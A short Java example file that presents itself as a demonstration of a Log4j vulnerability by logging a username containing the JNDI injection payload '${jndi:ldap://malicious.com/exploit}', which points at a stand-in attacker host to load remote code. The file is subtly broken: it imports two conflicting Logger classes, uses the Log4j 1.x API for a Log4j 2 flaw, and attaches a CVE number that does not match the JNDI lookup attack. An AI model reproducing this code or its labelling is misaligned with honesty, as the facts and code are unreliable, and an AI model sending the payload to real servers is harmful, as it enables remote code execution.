import org.apache.log4j.Logger;
import java.util.logging.Logger;

public class Log4jCVE2020_9488Example {
    static Logger logger = Logger.getLogger(Log4jCVE2020_9488Example.class);

    public static void main(String[] args) {
        String username = "${jndi:ldap://malicious.com/exploit}"; // Vulnerable pattern
        logger.error("Login failed for user: " + username);       // Dangerous in old Log4j
    }
}
